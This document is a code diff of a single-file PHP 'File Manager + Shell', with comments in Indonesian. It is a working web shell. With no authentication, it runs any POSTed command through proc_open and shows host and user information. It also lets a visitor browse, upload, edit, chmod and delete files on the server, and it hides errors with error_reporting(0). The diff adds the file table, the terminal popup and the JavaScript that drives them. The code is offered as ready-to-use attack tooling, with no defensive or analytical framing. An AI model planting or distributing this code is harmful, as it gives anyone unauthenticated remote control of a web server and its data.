@@ -2,40 +2,62 @@
 error_reporting(0);
 set_time_limit(0);
 
-// === File Manager + Shell (single file, ready to download) ===
-// - Menampilkan file/folder dengan icon berdasarkan ekstensi
-// - Bisa membuat file/dir, upload, delete, chmod
-// - Edit file via modal (AJAX)
-// - Terminal (AJAX) menjalankan perintah di direktori saat ini
-// - Sesuaikan izin dan environment sebelum dipakai di server produksi
+// Check if this is a terminal request
+$isTerminalRequest = isset($_POST['terminal_command']);
 
-// ---------------------------
-// Configuration: icon mapping
-// ---------------------------
-$file_icons = [
-    'htaccess' => 'https://solevisible.com/icons/htaccess.png',
-    'php'      => 'https://solevisible.com/icons/php.png',
-    'txt'      => 'https://solevisible.com/icons/txt.png',
-    'xml'      => 'https://solevisible.com/icons/xml.png',
-    'html'     => 'https://solevisible.com/icons/html.png',
-    'default'  => 'https://solevisible.com/icons/notfound.png'
-];
-
-function get_file_icon($filename, $file_icons) {
-    $base = basename($filename);
-    // Khusus .htaccess
-    if (strtolower($base) === '.htaccess') return $file_icons['htaccess'];
-
-    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    if ($ext && isset($file_icons[$ext])) return $file_icons[$ext];
-    return $file_icons['default'];
+// Handle terminal commands first to prevent HTML output
+if ($isTerminalRequest) {
+    $initial_path = realpath(getcwd());
+    $path = $initial_path;
+    
+    if (isset($_GET['path'])) {
+        $tmp = realpath($_GET['path']);
+        if ($tmp && is_dir($tmp)) {
+            $path = $tmp;
+        }
+    }
+    
+    chdir($path);
+    $cmd = $_POST['terminal_command'];
+    $descriptorspec = [
+        0 => ['pipe', 'r'],
+        1 => ['pipe', 'w'],
+        2 => ['pipe', 'w']
+    ];
+    $process = proc_open($cmd, $descriptorspec, $pipes);
+    $output = '';
+    if (is_resource($process)) {
+        fclose($pipes[0]);
+        $output = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+        $err = stream_get_contents($pipes[2]);
+        fclose($pipes[2]);
+        proc_close($process);
+        if ($err) {
+            $output .= "\nError:\n" . $err;
+        }
+    } else {
+        $output = "Failed to execute command.";
+    }
+    
+    header('Content-Type: text/plain');
+    echo $output;
+    exit;
 }
 
-// ---------------------------
-// Utility functions
-// ---------------------------
+// Regular file manager code
+$initial_path = realpath(getcwd());
+$path = $initial_path;
+
+if (isset($_GET['path'])) {
+    $tmp = realpath($_GET['path']);
+    if ($tmp && is_dir($tmp)) {
+        $path = $tmp;
+    }
+}
+
 function safe_path($path) {
-    $real = @realpath($path);
+    $real = realpath($path);
     return $real ?: false;
 }
 
@@ -57,99 +79,13 @@ function getUserGroup($file) {
     return [$user, $group];
 }
 
-function formatPerm($perm) {
-    $type = '?';
-    if (($perm & 0xC000) === 0xC000) $type = 's';
-    elseif (($perm & 0xA000) === 0xA000) $type = 'l';
-    elseif (($perm & 0x8000) === 0x8000) $type = '-';
-    elseif (($perm & 0x6000) === 0x6000) $type = 'b';
-    elseif (($perm & 0x4000) === 0x4000) $type = 'd';
-    elseif (($perm & 0x2000) === 0x2000) $type = 'c';
-    elseif (($perm & 0x1000) === 0x1000) $type = 'p';
-
-    $rwx = '';
-    $masks = [ 
-        0x0100, 0x0080, 0x0040,
-        0x0020, 0x0010, 0x0008,
-        0x0004, 0x0002, 0x0001
-    ];
-    $chars = ['r','w','x','r','w','x','r','w','x'];
-
-    for ($i=0; $i<9; $i++) {
-        $rwx .= ($perm & $masks[$i]) ? $chars[$i] : '-';
-    }
-
-    if ($perm & 0x800) $rwx[2] = ($rwx[2] == 'x') ? 's' : 'S';
-    if ($perm & 0x400) $rwx[5] = ($rwx[5] == 'x') ? 's' : 'S';
-    if ($perm & 0x200) $rwx[8] = ($rwx[8] == 'x') ? 't' : 'T';
-
-    return $type . $rwx;
-}
-
-function permOctal($perm) {
-    return substr(sprintf('%o', $perm), -4);
-}
-
-function human_filesize($bytes, $decimals = 2) {
-    $sz = ['B','KB','MB','GB','TB','PB'];
-    if ($bytes == 0) return '0B';
-    $factor = floor((strlen((string)$bytes) - 1) / 3);
-    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . $sz[$factor];
-}
-
-// ---------------------------
-// Initial path and terminal handling
-// ---------------------------
-$initial_path = realpath(getcwd());
-$path = $initial_path;
-
-// Terminal AJAX handler
-$isTerminalRequest = isset($_POST['terminal_command']);
-if ($isTerminalRequest) {
-    if (isset($_GET['path'])) {
-        $tmp = realpath($_GET['path']);
-        if ($tmp && is_dir($tmp)) $path = $tmp;
-    }
-    chdir($path);
-    $cmd = $_POST['terminal_command'];
-    $descriptorspec = [
-        0 => ['pipe', 'r'],
-        1 => ['pipe', 'w'],
-        2 => ['pipe', 'w']
-    ];
-    $process = @proc_open($cmd, $descriptorspec, $pipes);
-    $output = '';
-    if (is_resource($process)) {
-        @fclose($pipes[0]);
-        $output = @stream_get_contents($pipes[1]);
-        @fclose($pipes[1]);
-        $err = @stream_get_contents($pipes[2]);
-        @fclose($pipes[2]);
-        @proc_close($process);
-        if ($err) $output .= "\nError:\n" . $err;
-    } else {
-        $output = "Failed to execute command.";
-    }
-    header('Content-Type: text/plain');
-    echo $output;
-    exit;
-}
-
-// ---------------------------
-// Normal file manager flow
-// ---------------------------
-if (isset($_GET['path'])) {
-    $tmp = realpath($_GET['path']);
-    if ($tmp && is_dir($tmp)) $path = $tmp;
-}
-
 // System info
 $uname = php_uname();
 $userInfo = @posix_getpwuid(posix_geteuid());
 $groupInfo = @posix_getgrgid(posix_getegid());
 $phpVersion = phpversion();
 $safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
-$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME'] ?? 'localhost');
+$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']);
 $clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 $dateTime = date('Y-m-d H:i:s');
 $software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
@@ -283,9 +219,45 @@ if (isset($_GET['view'])) {
     }
 }
 
-// ---------------------------
-// Output HTML
-// ---------------------------
+function formatPerm($perm) {
+    $type = '?';
+    if (($perm & 0xC000) === 0xC000) $type = 's';
+    elseif (($perm & 0xA000) === 0xA000) $type = 'l';
+    elseif (($perm & 0x8000) === 0x8000) $type = '-';
+    elseif (($perm & 0x6000) === 0x6000) $type = 'b';
+    elseif (($perm & 0x4000) === 0x4000) $type = 'd';
+    elseif (($perm & 0x2000) === 0x2000) $type = 'c';
+    elseif (($perm & 0x1000) === 0x1000) $type = 'p';
+
+    $rwx = '';
+    $masks = [ 
+        0x0100, 0x0080, 0x0040,
+        0x0020, 0x0010, 0x0008,
+        0x0004, 0x0002, 0x0001
+    ];
+    $chars = ['r','w','x','r','w','x','r','w','x'];
+
+    for ($i=0; $i<9; $i++) {
+        $rwx .= ($perm & $masks[$i]) ? $chars[$i] : '-';
+    }
+    
+    if ($perm & 0x800) $rwx[2] = ($rwx[2] == 'x') ? 's' : 'S';
+    if ($perm & 0x400) $rwx[5] = ($rwx[5] == 'x') ? 's' : 'S';
+    if ($perm & 0x200) $rwx[8] = ($rwx[8] == 'x') ? 't' : 'T';
+
+    return $type . $rwx;
+}
+
+function permOctal($perm) {
+    return substr(sprintf('%o', $perm), -4);
+}
+
+function human_filesize($bytes, $decimals = 2) {
+    $sz = ['B','KB','MB','GB','TB','PB'];
+    if ($bytes == 0) return '0B';
+    $factor = floor((strlen((string)$bytes) - 1) / 3);
+    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . $sz[$factor];
+}
 ?>
 <!DOCTYPE html>
 <html lang="id">
@@ -302,32 +274,29 @@ html, body {
 
 body {
   padding: 20px;
-  background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background color */
   background-image: url('https://i.imgur.com/gnQC6Ou.png');
   background-size: cover;
   background-position: center center;
-  background-attachment: fixed;
+  background-attachment: fixed; /* Ini yang membuat background tetap saat discroll */
   background-repeat: no-repeat;
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
   color: #ddd;
   line-height: 1.6;
   min-height: 100vh;
 }
-
+a { color: #61dafb; text-decoration: none; }
+a:hover { color: #21a1f1; text-decoration: underline; }
+h2, h3 { font-weight: 600; }
 table {
   width: 100%;
   border-collapse: separate;
   border-spacing: 0;
   margin-top: 1rem;
-  background-color: rgba(0, 0, 0, 0.5); /* Transparent table background */
+  background-color: #1e1e1e;
   border-radius: 8px;
   overflow: hidden;
 }
-
-thead {
-  background: linear-gradient(90deg, rgba(34, 34, 34, 0.7), rgba(51, 51, 51, 0.7)); /* Semi-transparent header */
-}
-
+thead { background: linear-gradient(90deg, #222, #333); }
 th, td {
   padding: 12px 16px;
   text-align: left;
@@ -335,74 +304,74 @@ th, td {
   vertical-align: middle;
   color: #ccc;
 }
+th { color: #61dafb; font-weight: 700; user-select: none; }
+tbody tr:hover { background-color: #2c2c2c; }
+td a.folder::before { content: "📁"; margin-right: 8px; font-size: 1.15rem; }
+td a.file::before   { content: "📄"; margin-right: 8px; font-size: 1.15rem; cursor: pointer; }
+.del-link { color: #e74c3c; font-weight: 600; margin-right: 8px; }
+.del-link:hover { color: #ff6b6b; }
+.form-chmod { display:inline-flex; gap:6px; align-items:center; margin:0; }
+.form-chmod input[type=text] { width:64px; padding:4px 6px; border-radius:4px; border:1px solid #333; background:#111; color:#0f0; }
+.form-chmod input[type=submit] { padding:6px 8px; background:#4caf50; color:#121212; border:none; border-radius:4px; cursor:pointer; }
+.actions-container { display:flex; gap:16px; flex-wrap:wrap; align-items:flex-end; margin-top:2rem; }
+.actions-label { display:flex; flex-direction:column; font-weight:600; font-size:0.9rem; color:#ccc; min-width:160px; max-width:280px; }
+.actions-label input[type=text], .actions-label input[type=file] { margin-top:6px; padding:8px 12px; font-family:monospace; font-size:1rem; border-radius:5px; border:1.5px solid #333; background-color:#1f1f1f; color:#0f0; }
+.btn-primary { background-color:#61dafb; color:#121212; border:none; padding:10px 20px; font-weight:600; border-radius:5px; cursor:pointer; min-width:110px; height:38px; }
+.btn-primary:hover { background-color:#21a1f1; }
+#terminal-popup { display:none; position:fixed; top:50%; left:50%; width:90vw; max-width:1000px; height:600px; transform:translate(-50%, -50%); background:#111; border-radius:10px; box-shadow:0 0 15px #61dafbaa; z-index:9999; flex-direction:column; }
+#terminal-popup.active { display:flex; }
+#terminal-popup .header { background:#222; padding:12px 16px; color:#0f0; font-family:monospace; font-weight:600; display:flex; justify-content:space-between; align-items:center; border-radius:10px 10px 0 0; }
+#terminal-popup .header button.close-btn { background:transparent; border:none; color:#0f0; font-weight:700; font-size:1.2rem; cursor:pointer; }
+#terminal-popup textarea { flex-grow:1; background:#000; color:#0f0; font-family:monospace; font-size:1rem; border:none; border-radius:0 0 10px 10px; padding:12px; resize:none; white-space:pre-wrap; overflow-y:auto; }
+#terminal-popup form { display:flex; border-top:1px solid #222; padding:8px 16px; }
+#terminal-popup input[type=text] { flex-grow:1; background:#222; color:#0f0; border:none; padding:8px 12px; font-family:monospace; font-size:1rem; border-radius:6px 0 0 6px; outline:none; }
+#terminal-popup input[type=submit] { background:#4caf50; border:none; color:white; padding:8px 20px; font-weight:600; font-size:1rem; border-radius:0 6px 6px 0; cursor:pointer; }
 
-h2, h3 {
-  font-weight: 600;
+/* modal edit file */
+#editModal { display:none; position:fixed; z-index:10000; left:50%; top:50%; transform:translate(-50%,-50%); width:90vw; max-width:1000px; height:80vh; background:#111; border-radius:10px; box-shadow:0 0 20px #61dafbaa; flex-direction:column; }
+#editModal.active { display:flex; }
+#editModal .header { background:#222; padding:12px 16px; color:#0f0; font-family:monospace; font-weight:600; display:flex; justify-content:space-between; align-items:center; border-radius:10px 10px 0 0; }
+#editModal textarea { flex:1 1 auto; background:#000; color:#0f0; font-family:monospace; font-size:0.95rem; border:none; border-radius:0 0 10px 10px; padding:12px; resize:vertical; overflow:auto; min-height:200px; }
+#editModal .footer { padding:10px 16px; display:flex; gap:8px; justify-content:flex-end; border-top:1px solid #222; }
+#editModal .meta { padding:8px 12px; color:#aaa; font-family:monospace; }
+.btn-save { background:#4caf50; color:#121212; border:none; padding:10px 18px; border-radius:6px; cursor:pointer; font-weight:600; }
+.btn-cancel { background:#e74c3c; color:#fff; border:none; padding:10px 18px; border-radius:6px; cursor:pointer; font-weight:600; }
+.small-muted { color:#888; font-size:0.9rem; margin-right:auto; align-self:center; padding-left:8px; }
+@media (max-width:720px) {
+  #editModal { width:95vw; height:85vh; }
 }
 
-a {
-  color: #61dafb;
-  text-decoration: none;
+/* System info styling */
+.sysinfo {
+    background: linear-gradient(135deg, #0a0a0a, #1b1b1b);
+    border: 1px solid #0f0;
+    border-radius: 10px;
+    padding: 15px 20px;
+    font-family: 'Courier New', monospace;
+    color: #0f0;
+    max-width: 100%;
+    box-shadow: 0 0 10px #0f0;
+    margin-bottom: 20px;
 }
-
-a:hover {
-  color: #21a1f1;
+.sysinfo h2 {
+    text-align: center;
+    margin-top: 0;
+    font-size: 20px;
+    color: #0f0;
+    border-bottom: 1px solid #0f0;
+    padding-bottom: 5px;
 }
-
-/* Tombol dengan ikon */
-.actions-container {
-  display: flex;
-  gap: 16px;
-  flex-wrap: wrap;
-  align-items: flex-end;
-  margin-top: 2rem;
+.sysinfo table {
+    width: 100%;
+    border-collapse: collapse;
 }
-
-.actions-label {
-  display: flex;
-  flex-direction: column;
-  font-weight: 600;
-  font-size: 0.9rem;
-  color: #ccc;
-  min-width: 160px;
-  max-width: 280px;
+.sysinfo td {
+    padding: 5px;
+    vertical-align: top;
 }
-
-.actions-label input[type=text], .actions-label input[type=file] {
-  margin-top: 6px;
-  padding: 8px 12px;
-  font-family: monospace;
-  font-size: 1rem;
-  border-radius: 5px;
-  border: 1.5px solid #333;
-  background-color: #1f1f1f;
-  color: #0f0;
-}
-
-.btn-primary {
-  background-color: rgba(97, 218, 251, 0.7); /* Transparent background for buttons */
-  color: #121212;
-  border: none;
-  padding: 10px 20px;
-  font-weight: 600;
-  border-radius: 5px;
-  cursor: pointer;
-  min-width: 110px;
-  height: 38px;
-  display: inline-flex;
-  align-items: center;
-  gap: 8px; /* Menambahkan jarak antara ikon dan teks */
-  justify-content: center;
-}
-
-.btn-primary:hover {
-  background-color: rgba(33, 161, 241, 0.7);
-}
-
-/* Ikon tombol */
-.btn-icon {
-  width: 16px; /* Ukuran ikon */
-  height: 16px; /* Ukuran ikon */
+.sysinfo td:first-child {
+    font-weight: bold;
+    width: 120px;
 }
 </style>
 </head>
@@ -412,7 +381,7 @@ a:hover {
 <h2>System Information</h2>
 <table>
 <tr><td>Uname:</td><td><?=htmlspecialchars($uname)?></td></tr>
-<tr><td>User:</td><td><?=(isset($userInfo['uid'])?$userInfo['uid']:'-')?> [ <?=(isset($userInfo['name'])?$userInfo['name']:'-')?> ] Group: <?=(isset($groupInfo['gid'])?$groupInfo['gid']:'-')?> [ <?=(isset($groupInfo['name'])?$groupInfo['name']:'-')?> ]</td></tr>
+<tr><td>User:</td><td><?=$userInfo['uid']?> [ <?=$userInfo['name']?> ] Group: <?=$groupInfo['gid']?> [ <?=$groupInfo['name']?> ]</td></tr>
 <tr><td>PHP:</td><td><?=$phpVersion?> &nbsp; Safe Mode: <?=$safeMode?></td></tr>
 <tr><td>ServerIP:</td><td><?=$serverIP?> &nbsp; Your IP: <?=$clientIP?></td></tr>
 <tr><td>DateTime:</td><td><?=$dateTime?></td></tr>
@@ -422,36 +391,329 @@ a:hover {
 
 <h2>File Manager & Shell</h2>
 
+<div style="margin-bottom: 1rem; user-select: text; font-family: monospace; font-size: 0.95rem; white-space: nowrap;">
+  <span style="color: #999;">PWD:&nbsp;&nbsp;</span>
+  <?php
+  $crumbs = explode(DIRECTORY_SEPARATOR, $path);
+  $tmp_path = '';
+
+  echo '<a href="?path=' . urlencode(DIRECTORY_SEPARATOR) . '" style="color: #61dafb; text-decoration: none;">/</a>';
+
+  foreach ($crumbs as $crumb) {
+      if ($crumb === '' || $crumb === '.') continue;
+      $tmp_path .= DIRECTORY_SEPARATOR . $crumb;
+      echo '<span style="color:#555;">/</span>';
+      echo '<a href="?path=' . urlencode($tmp_path) . '" style="color: #61dafb; text-decoration: none;">' . htmlspecialchars($crumb) . '</a>';
+  }
+  echo '<span style="color:#555;">/</span>';
+  ?>
+
+  <a href="?path=<?= urlencode($initial_path) ?>" style="color: red; font-weight: 700; text-decoration: none; margin-left: 10px;">
+    [ Home Shell ]
+  </a>
+</div>
+
+<?php if (!empty($msg_error)) : ?>
+  <p style="color: #e74c3c; padding: 8px 12px; background: #1e1e1e; border-radius: 4px;"><?=htmlspecialchars($msg_error)?></p>
+<?php endif; ?>
+<?php if (!empty($msg_success)) : ?>
+  <p style="color: #4caf50; padding: 8px 12px; background: #1e1e1e; border-radius: 4px;"><?=htmlspecialchars($msg_success)?></p>
+<?php endif; ?>
+
 <form class="actions-container" method="post" enctype="multipart/form-data">
   <label class="actions-label">
     Make File:
     <input type="text" name="make_file" placeholder="New filename" autocomplete="off" />
   </label>
-  <button type="submit" name="make_file_submit" class="btn-primary">
-    <img src="https://solevisible.com/images/btn.png" alt="Create File Icon" class="btn-icon" />
-    Create File
-  </button>
+  <input type="submit" name="make_file_submit" value="Create File" class="btn-primary" />
 
   <label class="actions-label">
     Make Dir:
     <input type="text" name="make_dir" placeholder="New directory name" autocomplete="off" />
   </label>
-  <button type="submit" name="make_dir_submit" class="btn-primary">
-    <img src="https://solevisible.com/images/btn.png" alt="Create Directory Icon" class="btn-icon" />
-    Create Directory
-  </button>
+  <input type="submit" name="make_dir_submit" value="Create Directory" class="btn-primary" />
 
   <label class="actions-label" style="flex-grow: 1; min-width: 220px;">
     Upload File:
     <input type="file" name="file" />
   </label>
-  <button type="submit" class="btn-primary">
-    <img src="https://solevisible.com/images/btn.png" alt="Upload Icon" class="btn-icon" />
-    Upload
-  </button>
+  <input type="submit" value="Upload" class="btn-primary" />
+
+  <label class="actions-label" style="min-width: 220px;">
+    Change Dir:
+    <input type="text" name="change_dir" placeholder="Target path" autocomplete="off" />
+  </label>
+  <input type="submit" name="change_dir_submit" value="Change Directory" class="btn-primary" />
+  
+  <div style="display: flex; align-items: flex-end;">
+    <button type="button" id="openTerminalBtn" class="btn-primary">Open Terminal</button>
+  </div>
 </form>
 
-<!-- The rest of your table and code here -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Size</th>
+<th>Owner</th>
+<th>Group</th>
+<th>Permissions</th>
+<th>Created</th>
+<th>Actions</th>
+</tr>
+</thead>
+<tbody>
+<?php
+$itemsRaw = scandir($path);
+$folders = [];
+$filesList = [];
+foreach ($itemsRaw as $it) {
+    if ($it === '.' || $it === '..') continue;
+    $fullp = $path . DIRECTORY_SEPARATOR . $it;
+    if (is_dir($fullp)) $folders[] = $it;
+    else $filesList[] = $it;
+}
+natcasesort($folders);
+natcasesort($filesList);
+$files = array_merge($folders, $filesList);
 
+foreach ($files as $file) {
+    $full = $path . DIRECTORY_SEPARATOR . $file;
+    $is_dir = is_dir($full);
+    if ($file === '.' || $file === '..' || $file === '' || $file === null) continue;
+
+    $size = $is_dir ? '-' : human_filesize(filesize($full));
+    list($user, $group) = getUserGroup($full);
+    $perm_sym = formatPerm(fileperms($full));
+    $perm_octal = permOctal(fileperms($full));
+    $perm_display = $perm_octal . ' >> ' . $perm_sym;
+    $created_date = @filectime($full) ? date('Y-m-d H:i:s', filectime($full)) : '-';
+    $name_esc = htmlspecialchars($file);
+
+    echo '<tr>';
+    if ($is_dir) {
+        echo '<td><a href="?path=' . urlencode($full) . '" class="folder">' . $name_esc . '</a></td>';
+    } else {
+        $view_link = '?path=' . urlencode($path) . '&view=' . urlencode($file);
+        echo '<td><a href="' . $view_link . '" class="file" data-full="' . htmlspecialchars($full, ENT_QUOTES) . '">' . $name_esc . '</a></td>';
+    }
+
+    echo '<td>' . $size . '</td>';
+    echo '<td>' . htmlspecialchars($user) . '</td>';
+    echo '<td>' . htmlspecialchars($group) . '</td>';
+    
+    $color_perm = '#fff';
+    if (!$is_dir) {
+        $can_read = is_readable($full);
+        $can_write = is_writable($full);
+
+        if ($can_write) {
+            $color_perm = '#4CAF50';
+        } elseif ($can_read) {
+            $color_perm = '#fff';
+        } else {
+            $color_perm = '#e74c3c';
+        }
+    } else {
+        $color_perm = '#61dafb';
+    }
+
+    echo '<td><span title="Permission" style="color:' . $color_perm . ';">' . $perm_display . '</span></td>';
+    echo '<td>' . htmlspecialchars($created_date) . '</td>';
+
+echo '<td style="display:flex; gap:8px; align-items:center;">';
+// Form chmod selalu ditampilkan tanpa pengecekan is_writable
+echo '<form class="form-chmod" method="post" action="?path=' . urlencode($path) . '">';
+echo '<input type="hidden" name="chmod_file" value="' . htmlspecialchars($file) . '">';
+echo '<input type="text" name="new_perm" value="' . $perm_octal . '" maxlength="4" pattern="[0-7]{3,4}" title="Octal format, e.g. 0644" required>';
+echo '<input type="submit" value="Set">';
+echo '</form>';
+echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($file) . '" class="del-link" onclick="return confirm(\'Delete ' . addslashes($file) . '?\');">Del</a>';
+echo '</td>';
+
+    echo '</tr>';
+}
+?>
+</tbody>
+</table>
+
+<?php if ($file_view_content !== '') : ?>
+  <h3>View/Edit File: <?=htmlspecialchars(basename($file_to_view_path))?></h3>
+  <form method="post" action="?path=<?=urlencode($path)?>">
+    <textarea name="save_file" style="width:100%; height:300px; font-family: monospace; font-size: 0.9rem; padding: 12px; border-radius: 6px; border: 1.5px solid #333; background-color: #1e1e1e; color: #0f0;"><?=htmlspecialchars($file_view_content)?></textarea>
+    <input type="hidden" name="filename" value="<?=htmlspecialchars(basename($file_to_view_path))?>">
+    <input type="submit" value="Save File" class="btn-primary" style="margin-top: 0.8rem;">
+  </form>
+<?php endif; ?>
+
+<div id="editModal" role="dialog" aria-modal="true" aria-labelledby="editModalTitle">
+  <div class="header">
+    <span id="editModalTitle">Edit File</span>
+    <button class="close-btn" aria-label="Close" onclick="closeEditModal()">&times;</button>
+  </div>
+  <div style="padding:12px; display:flex; flex-direction:column; gap:8px;">
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+      <div class="small-muted">File: <span id="editFileName" style="color:#fff; font-family:monospace;"></span></div>
+      <div id="editFileSize" class="small-muted"></div>
+    </div>
+    <textarea id="editFileContent" spellcheck="false"></textarea>
+    <div class="footer">
+      <div class="small-muted" id="editMsg" style="display:none;"></div>
+      <button class="btn-save" id="btnSaveEdit">Save</button>
+      <button class="btn-cancel" onclick="closeEditModal()" type="button">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<div id="terminal-popup" role="dialog" aria-modal="true" aria-labelledby="terminal-title">
+  <div class="header">
+    <span id="terminal-title">Terminal - <?=htmlspecialchars($path)?></span>
+    <button class="close-btn" aria-label="Close Terminal">&times;</button>
+  </div>
+  <textarea readonly id="terminal-output"></textarea>
+  <form id="terminal-form">
+    <input type="text" id="terminal-input" autocomplete="off" placeholder="Enter command..." aria-label="Command input" required />
+    <input type="submit" value="Run" />
+  </form>
+</div>
+
+<script>
+  const openTerminalBtn = document.getElementById('openTerminalBtn');
+  const terminalPopup = document.getElementById('terminal-popup');
+  const terminalCloseBtn = terminalPopup.querySelector('.close-btn');
+  const terminalOutput = document.getElementById('terminal-output');
+  const terminalForm = document.getElementById('terminal-form');
+  const terminalInput = document.getElementById('terminal-input');
+
+  openTerminalBtn.addEventListener('click', () => {
+    terminalPopup.classList.add('active');
+    terminalOutput.value = '';
+    terminalInput.value = '';
+    terminalInput.focus();
+  });
+
+  terminalCloseBtn.addEventListener('click', () => {
+    terminalPopup.classList.remove('active');
+  });
+
+  terminalForm.addEventListener('submit', e => {
+    e.preventDefault();
+    const cmd = terminalInput.value.trim();
+    if (!cmd) return;
+    
+    terminalOutput.value += `$ ${cmd}\n`;
+    terminalInput.value = '';
+    
+    fetch(window.location.pathname + '?path=<?=urlencode($path)?>', {
+        method: 'POST',
+        headers: { 
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest'
+        },
+        body: new URLSearchParams({ terminal_command: cmd })
+    })
+    .then(res => res.text())
+    .then(text => {
+        terminalOutput.value += text + "\n";
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    })
+    .catch(() => {
+        terminalOutput.value += "[ERROR] Failed to execute command.\n";
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    });
+  });
+
+  window.addEventListener('keydown', e => {
+    if (e.key === 'Escape') {
+        if (terminalPopup.classList.contains('active')) terminalPopup.classList.remove('active');
+        if (document.getElementById('editModal').classList.contains('active')) closeEditModal();
+    }
+  });
+
+  const editModal = document.getElementById('editModal');
+  const editFileNameEl = document.getElementById('editFileName');
+  const editFileContentEl = document.getElementById('editFileContent');
+  const editFileSizeEl = document.getElementById('editFileSize');
+  const editMsg = document.getElementById('editMsg');
+  let currentEditingFullPath = null;
+  let currentEditingFilenameOnly = null;
+
+  document.querySelectorAll('a.file').forEach(a => {
+    a.addEventListener('click', function(e) {
+        e.preventDefault();
+        const full = this.getAttribute('data-full');
+        if (!full) return;
+        openEditModal(full);
+    });
+  });
+
+  function openEditModal(fullPath) {
+    currentEditingFullPath = fullPath;
+    fetch(window.location.pathname + '?ajax_view=' + encodeURIComponent(fullPath))
+      .then(r => {
+        if (!r.ok) throw new Error('404');
+        return r.text();
+      })
+      .then(text => {
+        editFileContentEl.value = text;
+        const parts = fullPath.split(/[\\/]/);
+        currentEditingFilenameOnly = parts[parts.length - 1];
+        editFileNameEl.textContent = currentEditingFilenameOnly;
+        editFileSizeEl.textContent = (new Blob([text]).size) + ' bytes';
+        editMsg.style.display = 'none';
+        editModal.classList.add('active');
+        editFileContentEl.focus();
+      })
+      .catch(err => {
+        alert('Failed to open file for editing.');
+      });
+  }
+
+  function closeEditModal() {
+    editModal.classList.remove('active');
+    currentEditingFullPath = null;
+    currentEditingFilenameOnly = null;
+  }
+
+  document.getElementById('btnSaveEdit').addEventListener('click', function() {
+    if (!currentEditingFilenameOnly) return alert('No file being edited.');
+    const content = editFileContentEl.value;
+    const formBody = new URLSearchParams();
+    formBody.append('save_file', content);
+    formBody.append('filename', currentEditingFilenameOnly);
+
+    fetch(window.location.pathname + '?path=<?=urlencode($path)?>', {
+      method: 'POST',
+      headers: { 
+          'Content-Type': 'application/x-www-form-urlencoded', 
+          'X-Requested-With': 'XMLHttpRequest' 
+      },
+      body: formBody.toString()
+    }).then(r => r.text())
+    .then(resp => {
+      if (resp.trim() === 'OK') {
+        editMsg.textContent = 'Saved';
+        editMsg.style.color = '#4caf50';
+        editMsg.style.display = 'block';
+        setTimeout(() => {
+          closeEditModal();
+          window.location.reload();
+        }, 600);
+      } else {
+        if (resp.indexOf('OK') !== -1) {
+          window.location.reload();
+        } else {
+          editMsg.textContent = 'Save failed';
+          editMsg.style.color = '#e74c3c';
+          editMsg.style.display = 'block';
+        }
+      }
+    }).catch(() => {
+      editMsg.textContent = 'Save failed (network)';
+      editMsg.style.color = '#e74c3c';
+      editMsg.style.display = 'block';
+    });
+  });
+</script>
 </body>
 </html>
